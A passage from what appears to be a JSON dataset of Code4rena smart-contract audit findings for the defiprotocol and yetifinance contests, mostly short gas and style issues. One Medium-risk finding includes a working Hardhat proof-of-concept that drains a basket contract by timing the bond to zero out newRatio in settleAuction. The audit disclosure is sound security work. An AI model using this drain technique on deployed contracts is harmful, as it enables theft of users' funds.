Input Validation May Break Other Function"}, {"title": "setAuctionMultiplier() Lack of Input Validation May Break Other Function", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/82", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "setAuctionMultiplier() Lack of Input Validation May Break Other Function"}, {"title": "Possible division by zero in `settleAuction`", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/77", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Possible division by zero in `settleAuction`"}, {"title": "Unnecessary variable initialization and TODO in code", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/76", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Unnecessary variable initialization and TODO in code"}, {"title": "Basket can be fully drained if the auction is settled within a specific block", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/74", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-defiprotocol-findings", "body": "# Handle  Ruhum   # Vulnerability details  ## Impact The `settleAuction()` function allows someone to settle the auction by transferring funds in a way that the new pending index is fulfilled. As a reward, they are able to take out as many tokens as they want as long as the pending index is fulfilled after that. The function verifies that the basket has received everything it wanted using the following logic: ```sol         for (uint256 i = 0; i < pendingWeights.length; i++) {             uint256 tokensNeeded = basketAsERC20.totalSupply() * pendingWeights[i] * newRatio / BASE / BASE;             require(IERC20(pendingTokens[i]).balanceOf(address(basket)) >= tokensNeeded);         } ``` The attack vector here is to manipulate `tokensNeeded` to be 0. That way we can drain the basket completely without the function reverting.  For that, we manipulate `newRatio` to be 0 then the whole thing will be 0. `newRatio` is defined as: ```sol         uint256 a = factory.auctionMultiplier() * basket.ibRatio();         uint256 b = (bondBlock - auctionStart) * BASE / factory.auctionDecrement();         uint256 newRatio = a - b; ``` There's 1 value the attacker controls, `bondBlock`. That value is the block in which the `bondForRebalance()` function was triggered. So the goal is to get `newRatio` to be 0. With the base settings of the contract:  - auctionMultiplier == 2 - ibRatio == 1e18 - BASE == 1e18 - auctionDecrement == 10000  `bondBlock` has to be `auctionStart + 20000`. Meaning, the `bondForRebalance()` function has to be triggered exactly 20000 blocks after the action was started. That would be around 3 1/2 days after auction start.  At that point, `newRatio` is 0, and thus `tokensNeeded` is 0. The only thing left to do is to call `settleAuction()` and pass the basket's tokens and balance as the output tokens and weight.  ## Proof of Concept Here's a test implementing the above scenario as a test. You can add it to `Auction.test.js`.:  ```js       it.only(\"should allow me to steal funds\", async() => {         // start an auction         let NEW_UNI_WEIGHT = \"2400000000000000000\";         let NEW_COMP_WEIGHT = \"2000000000000000000\";         let NEW_AAVE_WEIGHT = \"400000000000000000\";          await expect(basket.publishNewIndex([UNI.address, COMP.address, AAVE.address],              [NEW_UNI_WEIGHT, NEW_COMP_WEIGHT, NEW_AAVE_WEIGHT], 1)).to.be.ok;         await increaseTime(60 * 60 * 24)         await increaseTime(60 * 60 * 24)         await expect(basket.publishNewIndex([UNI.address, COMP.address, AAVE.address],            [NEW_UNI_WEIGHT, NEW_COMP_WEIGHT, NEW_AAVE_WEIGHT], 1)).to.be.ok;          let auctionAddr = await basket.auction();         let auction = AuctionImpl.attach(auctionAddr);          ethers.provider.getBlockNumber();         // increase the block number for `bondBlock - auctionStart` to be 20000.         // When that's the case, the result of `newRatio` in `settleAuction()`          // is `0`. And that means `tokensNeeded` is 0. Which means,         // we can take out all the tokens we want using the `outputTokens` array         // without having to worry about basket's balance at the end.         // The math changes depending on the settings of the factory contract or the         // Basket contract. But, the gist is that you try to get newRatio to be 0.         // The only values you can control as a attacker is the bondBlock after the auction         // was started.         for (let i = 0; i < 20000; i++) {           await hre.network.provider.send(\"evm_mine\")         }         await basket.approve(auction.address, '5000000000000000');         await expect(auction.bondForRebalance()).to.be.ok;         await expect(auction.settleAuction([], [], [], [UNI.address, AAVE.address], [\"200720000000000000\", \"200120000000000000\"])).to.be.ok;       }); ```  Again, this test uses the base values. The math changes when the settings change. But, it should always be possible to trigger this attack. The gap between auction start and bonding just changes.  ## Tools Used manual analysis  ## Recommended Mitigation Steps - Verify that `newRatio != 0`  "}, {"title": "Wrong syntax in test leads to wrong test results", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/62", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Wrong syntax in test leads to wrong test results"}, {"title": "Lost fees due to precision loss in fees calculation", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/60", "labels": ["bug", "2 (Med Risk)"], "target": "2021-12-defiprotocol-findings", "body": "Lost fees due to precision loss in fees calculation"}, {"title": "Wrong fee calculation after totalSupply was 0", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/58", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-defiprotocol-findings", "body": "# Handle  kenzo   # Vulnerability details  `handleFees` does not update `lastFee` if `startSupply == 0`. This means that wrongly, extra fee tokens would be minted once the basket is resupplied and `handleFees` is called again.  ## Impact Loss of user funds. The extra minting of fee tokens comes on the expense of the regular basket token owners, which upon withdrawal would get less underlying than their true share, due to the dilution of their tokens' value.  ## Proof of Concept Scenario: - All basket token holders are burning their tokens. The last burn would set totalSupply to 0. - After 1 day, somebody mints basket tokens. `handleFees` would be called upon mint, and would just return since totalSupply == 0. Note: It does not update `lastFee`. ``` } else if (startSupply == 0) {             return; ``` https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L136:#L137 - The next block, somebody else mints a token. Now `handleFees` will be called and will calculate the fees according to the current supply and the time diff between now and `lastFee`: ``` uint256 timeDiff = (block.timestamp - lastFee); ``` https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L139 But as we saw, `lastFee` wasn't updated in the previous step. `lastFee` is still the time of 1 day before - when the last person burned his tokens and the basket supply was 0. So now the basket will mint fees as if a whole day has passed since the last calculation, but actually it only needs to calculate the fees for the last block, since only then we had tokens in the basket.  ## Recommended Mitigation Steps Set `lastFee = block.timestamp` if `startSupply == 0`.  "}, {"title": "`auctionImpl` and `basketImpl` in factory can be made immutable for gas savings", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/57", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "`auctionImpl` and `basketImpl` in factory can be made immutable for gas savings"}, {"title": "Bonding doesn't seem to perform any meaningful role and leads to inefficient auctions", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/56", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "Bonding doesn't seem to perform any meaningful role and leads to inefficient auctions"}, {"title": "Publisher can lock all user funds in the Basket in order to force a user to have their bond burned", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/53", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "Publisher can lock all user funds in the Basket in order to force a user to have their bond burned"}, {"title": "Incorrent visibility for \"initialized\" variable", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/50", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-12-defiprotocol-findings", "body": "# Handle  neslinesli93   # Vulnerability details  ## Impact The `initialized` variable has its visibility set to `public`, while it should be private. The reason is that any contract that inherits from `Auction.sol` or `Basket.sol` may reset the value for  the `initialized` variable  ## Recommended Mitigation Steps Reduce `initialized` visibility to `private` in both contracs  "}, {"title": "Basket:pushUnderlying()/pullUnderlying() cache ibRatio to save gas", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/49", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Basket:pushUnderlying()/pullUnderlying() cache ibRatio to save gas"}, {"title": "Basket:handleFees() use unchecked to save gas", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/47", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Basket:handleFees() use unchecked to save gas"}, {"title": "Basket:initialize() reuse function argument instead of storage variable", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/46", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Basket:initialize() reuse function argument instead of storage variable"}, {"title": "Factory:constructor don't need to zero initialize storage variable", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/45", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Factory:constructor don't need to zero initialize storage variable"}, {"title": "Factory:setOwnerSplit owner fee split can be set to exactly 20%", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/44", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Factory:setOwnerSplit owner fee split can be set to exactly 20%"}, {"title": "Basket:handleFees fee calculation is wrong", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/43", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-defiprotocol-findings", "body": "# Handle  GiveMeTestEther   # Vulnerability details  ## Impact The fee calculation on L141 is wrong. It should only get divided by BASE and not (BASE - feePct)  ## Proof of Concept This shows dividing only by BASE is correct: Assumptions:  - BASE is 1e18 accordign to the code - timeDiff is exactly ONE_YEAR (for easier calculations) - startSupply is 1e18 (exactly one basket token, also represents 100% in fee terms) - licenseFee is 1e15 (0.1%) If we calculate the fee of one whole year and startSupply is one token (1e18, equal to 100%), the fee should be exactly the licenseFee  (1e15, 0.1%),  uint256 timeDiff = ONE_YEAR;  uint256 feePct = timeDiff * licenseFee / ONE_YEAR; => therefore we have: feePct = licenseFee which is 1e15 (0.1%) according to our assumptions uint256 fee = startSupply * feePct / BASE; // only divide by BASE => insert values => fee = 1e18 * licenseFee  / 1e18 = licenseFee    This shows the math is wrong:  Assumptions:  - BASE is 1e18 according to the code - timeDiff is exactly ONE_YEAR (for easier calculations) - startSupply is 1e18 (exactly one basket token, also represents 100% in fee terms) - licenseFee is 1e15 (0.1%) If we calculate the fee of one whole year and startSupply is one token (1e18, equal to 100%), the fee should be exactly the licenseFee  (1e15, 0.1%), but the fee is bigger than that.   uint256 timeDiff = ONE_YEAR;  uint256 feePct = timeDiff * licenseFee / ONE_YEAR; => therefore we have: feePct = licenseFee which is 1e15 (0.1%) according to our assumptions  uint256 fee = startSupply * feePct / (BASE - feePct); insert the values => fee = 1e18 * 1e15 / (1e18 - 1e15) => (factor out 1e15) => fee = 1e15 * 1e18 / (1e15 * ( 1e3 - 1) => (cancel 1e15) => 1e18 / ( 1e3 - 1)  math: if we increase the divisor but the dividend stays the same we get a smaller number e.g. (1 / (2-1)) is bigger than (1 / 2) apply this here => 1e18 / ( 1e3 - 1) > 1e18 / 1e3 => 1e18 / ( 1e3 - 1) > 1e15  this shows that the fee is higher than 1e15   https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L133 https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L141  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps - only divide by BASE  "}, {"title": "Publisher switch logic can be simplified", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/41", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Publisher switch logic can be simplified"}, {"title": "Excessive checking of basket totalsupply", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/38", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Excessive checking of basket totalsupply"}, {"title": "Auction.hasBonded variable is unnecessary", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/37", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Auction.hasBonded variable is unnecessary"}, {"title": "Auction.auctionOngoing variable is unnecessary", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/36", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Auction.auctionOngoing variable is unnecessary"}, {"title": "changeLicenseFee() and fees for previous period", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/33", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "changeLicenseFee() and fees for previous period"}, {"title": "Emit for publishNewIndex / killAuction part", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/32", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-12-defiprotocol-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact Most of the public functions have an emit, however in function publishNewIndex(), there is no emit for the \"killauction\" part. It might be useful to have an emit there too.  ## Proof of Concept https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L216-L244  ```JS  function publishNewIndex(address[] memory _tokens, uint256[] memory _weights, uint256 _minIbRatio) onlyPublisher public override {    ...             } else {                 auction.killAuction();                 pendingWeights.tokens = _tokens;                 pendingWeights.weights = _weights;                 pendingWeights.timestamp = block.timestamp;                 pendingWeights.minIbRatio = _minIbRatio;                // no emit             } ```  ## Tools Used  ## Recommended Mitigation Steps Possibly add an emit in the \"killauction\" part   "}, {"title": "Missing Revert Messages", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/31", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Missing Revert Messages"}, {"title": "`Ownable` Contract Does Not Implement Two-Step Transfer Ownership Pattern", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/30", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "`Ownable` Contract Does Not Implement Two-Step Transfer Ownership Pattern"}, {"title": "Not verified function inputs of public / external functions", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/27", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-defiprotocol-findings", "body": "Not verified function inputs of public / external functions"}, {"title": "Storage double reading. Could save SLOAD", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/18", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Storage double reading. Could save SLOAD"}, {"title": "Lack of event indexing", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/15", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Lack of event indexing"}, {"title": "Remove override keyword from Basket", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/13", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Remove override keyword from Basket"}, {"title": "Remove override keyword from Auction", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/12", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Remove override keyword from Auction"}, {"title": "Use of Require statement without reason message", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/10", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Use of Require statement without reason message"}, {"title": "Remove override keyword", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/9", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Remove override keyword"}, {"title": "Lack of input verification", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/8", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Lack of input verification"}, {"title": "Gas: Redundant check in `setNewMaxSupply`", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/7", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Gas: Redundant check in `setNewMaxSupply`"}, {"title": "Lack of message in require statments", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/6", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Lack of message in require statments"}, {"title": "Lack of revert reason strings", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/5", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-defiprotocol-findings", "body": "Lack of revert reason strings"}, {"title": "Minted and Burned events are unnecessary", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/4", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Minted and Burned events are unnecessary"}, {"title": "Extra ERC20 approvals/transfers on Basket deployment", "html_url": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/2", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-defiprotocol-findings", "body": "Extra ERC20 approvals/transfers on Basket deployment"}, {"title": "Missing return statements", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/301", "labels": ["bug", "1 (Low Risk)"], "target": "2021-12-yetifinance-findings", "body": "Missing return statements"}, {"title": "claimYeti inclusive check", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/300", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact condition should be inclusive >= : ```solidity   if (available > totalClaimed.add(_amount)) ```  "}, {"title": "Gas Optimization: Unnecessary variables", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/299", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact The 3 variable defined in L365-367 are used only once https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/Dependencies/Whitelist.sol#L365-367 ```         uint256 price = getPrice(_collateral);         uint256 decimals = collateralParams[_collateral].decimals;         uint256 ratio = collateralParams[_collateral].ratio; ```  We can skip them and do everything inline: ``` return (getPrice(_collateral).mul(_amount).mul(collateralParams[_collateral].ratio).div(10**(18 + collateralParams[_collateral].decimals))); ```  Similarly, L352-354 ```         return getPrice(_collateral).mul(_amount).div(10**collateralParams[_collateral].decimals); ```  "}, {"title": "_isBeforeFeeBootstrapPeriod inside the loop", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/296", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact _isBeforeFeeBootstrapPeriod() is re-evaluated again and again inside the loop, although its value could be cached outside the loop and re-used to reduce gas costs.   "}, {"title": "Cache repeated calculations", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/294", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact In function _transfer, shares.to128(); can be cached to skip the same calculation again: ```solidity   users[from].balance = fromUser.balance - shares.to128();   users[to].balance = toUser.balance + shares.to128(); ``` Same here, the result can be extracted to a constant as it never changes: ```solidity   (DECIMAL_PRECISION / 2) ```  "}, {"title": "exists check passes when validCollateral length is 0", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/292", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-yetifinance-findings", "body": "exists check passes when validCollateral length is 0"}, {"title": "`_redeemCaller` should not obtain rights to future rewards for the `WJLP` they redeemed", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/291", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "`_redeemCaller` should not obtain rights to future rewards for the `WJLP` they redeemed"}, {"title": "Attacker can steal future rewards of `WJLP` from other users", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/290", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "Attacker can steal future rewards of `WJLP` from other users"}, {"title": "Cache storage variables in the stack can save gas", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/289", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "Cache storage variables in the stack can save gas"}, {"title": "Infinite mint", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/287", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "Infinite mint"}, {"title": "Unsafe approve in sYETIToken", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/286", "labels": ["bug", "1 (Low Risk)", "disagree with severity"], "target": "2021-12-yetifinance-findings", "body": "Unsafe approve in sYETIToken"}, {"title": "Liquidation can be escaped by depositing a WJLP with `_rewardOwner` != `_borrower`", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/284", "labels": ["bug", "3 (High Risk)"], "target": "2021-12-yetifinance-findings", "body": "Liquidation can be escaped by depositing a WJLP with `_rewardOwner` != `_borrower`"}, {"title": "Cache array length in for loops can save gas", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/283", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-yetifinance-findings", "body": "Cache array length in for loops can save gas"}, {"title": "Only using `SafeMath` when necessary can save gas", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/281", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "Only using `SafeMath` when necessary can save gas"}, {"title": "Only use `amount` when needed can save gas", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/279", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/TroveManagerLiquidations.sol#L839-L847  ```solidity=839 function _updateWAssetsRewardOwner(newColls memory _colls, address _borrower, address _newOwner) internal {         for (uint i = 0; i < _colls.tokens.length; i++) {             address token = _colls.tokens[i];             uint amount = _colls.amounts[i];             if (whitelist.isWrapped(token)) {                 IWAsset(token).updateReward(_borrower, _newOwner, amount);             }         }     } ```  Since `amount` is only needed in `if (whitelist.isWrapped(token)) {...}`, so `uint amount = _colls.amounts[i];` should be moved to inside `if (whitelist.isWrapped(token)) {...}`.  Furthermore, considering that `amount` is only used once, it can be replaced with `_colls.amounts[i]`.  ### Recommendation  Change to:  ```solidity=839 function _updateWAssetsRewardOwner(newColls memory _colls, address _borrower, address _newOwner) internal {     for (uint i = 0; i < _colls.tokens.length; i++) {         address token = _colls.tokens[i];         if (whitelist.isWrapped(token)) {             IWAsset(token).updateReward(_borrower, _newOwner, _colls.amounts[i]);         }     } } ```  "}, {"title": "Inline unnecessary function can make the code simpler and save some gas", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/278", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "Inline unnecessary function can make the code simpler and save some gas"}, {"title": "`HintHelpers.sol#setAddresses()` can be replaced with `constructor` and save gas", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/277", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-yetifinance-findings", "body": "`HintHelpers.sol#setAddresses()` can be replaced with `constructor` and save gas"}, {"title": "`10 ** 18` can be changed to `1e18` and save some gas", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/274", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-yetifinance-findings", "body": "`10 ** 18` can be changed to `1e18` and save some gas"}, {"title": "Public functions not used by current contract should be external", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/270", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-yetifinance-findings", "body": "Public functions not used by current contract should be external"}, {"title": "Tokens with fee on transfer are not supported", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/268", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-yetifinance-findings", "body": "Tokens with fee on transfer are not supported"}, {"title": "Missing error messages in require statements", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/265", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-yetifinance-findings", "body": "Missing error messages in require statements"}, {"title": "TeamLockup releases more tokens that it should", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/263", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  kenzo   # Vulnerability details  TeamLockup mentions on \"vestingLength\" that it is the \"number of YETI that are claimable every day after vesting starts\". However, the vesting calculation treats it as if was the number of YETI that are claimable every second, not every day.  ## Impact Tokens would be released faster than planned. Or, if the tokens are planned to be released every second and not every day (I'm guessing it's less likely), then this is a wrong comment.  ## Proof of Concept The description of `vestingLength`: [(Code ref)](https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/YETI/TeamLockup.sol#L15) ```     uint immutable vestingLength; // number of YETI that are claimable every day after vesting starts ```  The calculation to decide how many tokens can be released: [(Code ref)](https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/YETI/TeamLockup.sol#L41:#L43) ```         uint timePastVesting = block.timestamp.sub(vestingStart);         uint available = _min(totalVest,(totalVest.mul(timePastVesting)).div(vestingLength)); ``` The problem is that `timePastVesting` is in seconds, and `vestingLength` is in days.  ## Recommended Mitigation Steps Divide the calculation by `1 day` to align the units.  "}, {"title": "Adding unchecked directive can save gas", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/261", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "Adding unchecked directive can save gas"}, {"title": "`ERC20_8.sol` `totalSupply` should be increased on `mint` and decreased on `burn`", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/259", "labels": ["bug", "1 (Low Risk)", "disagree with severity"], "target": "2021-12-yetifinance-findings", "body": "`ERC20_8.sol` `totalSupply` should be increased on `mint` and decreased on `burn`"}, {"title": "Race condition on ERC20 approval", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/252", "labels": ["bug", "0 (Non-critical)"], "target": "2021-12-yetifinance-findings", "body": "Race condition on ERC20 approval"}, {"title": "`YetiFinanceTreasury.sol#updateTeamWallet()` should implement two-step transfer pattern", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/251", "labels": ["bug", "1 (Low Risk)"], "target": "2021-12-yetifinance-findings", "body": "`YetiFinanceTreasury.sol#updateTeamWallet()` should implement two-step transfer pattern"}, {"title": "Wrong vesting schedule for YETI mentioned in LockupContract", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/250", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  kenzo   # Vulnerability details  LockupContract, LockupContractFactory amd ShortLockupContract all have comments that say: ``` Within the first year from deployment, the deployer of the YETIToken (Liquity AG's address) may transfer YETI only to valid LockupContracts, and no other addresses (this is enforced in YETIToken.sol's transfer() function). The above two restrictions ensure that until one year after system deployment, YETI tokens originating from Liquity AG cannot enter circulating supply and cannot be staked to earn system revenue. ```  This comment is outdated (verified with sponsor). There is no such lockup on YETI tokens issued to team/treasury. (There might be other type of vesting which is probably implemented using TeamLockup.)  ## Impact Confusion, wrong description of team's capability to use yeti tokens issued.  ## Proof of Concept [Code ref](https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/YETI/LockupContract.sol#L13:#L18).  ## Recommended Mitigation Steps Remove outdated comments.  "}, {"title": "SafeMath with Solidity 0.8", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/246", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-yetifinance-findings", "body": "SafeMath with Solidity 0.8"}, {"title": "Deleting a mapping within a struct", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/245", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "Deleting a mapping within a struct"}, {"title": "ecrecover 0 address", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/244", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact ecrecover returns an empty address when the signature is invalid. As far as I checked, with the current codebase, there is no way to exploit it to gain any benefits, but it is a good practice to check against that. ```solidity   address recoveredAddress = ecrecover(digest, v, r, s);   require(recoveredAddress == owner, 'YUSD: invalid signature'); ```  ## Recommended Mitigation Steps require recoveredAddress != address(0)  You could also consider using OZ's ECDSA library for signature verifications: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol  "}, {"title": "Rescue assets in treasury contract", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/243", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-yetifinance-findings", "body": "Rescue assets in treasury contract"}, {"title": "setAddresses should only be callable once", 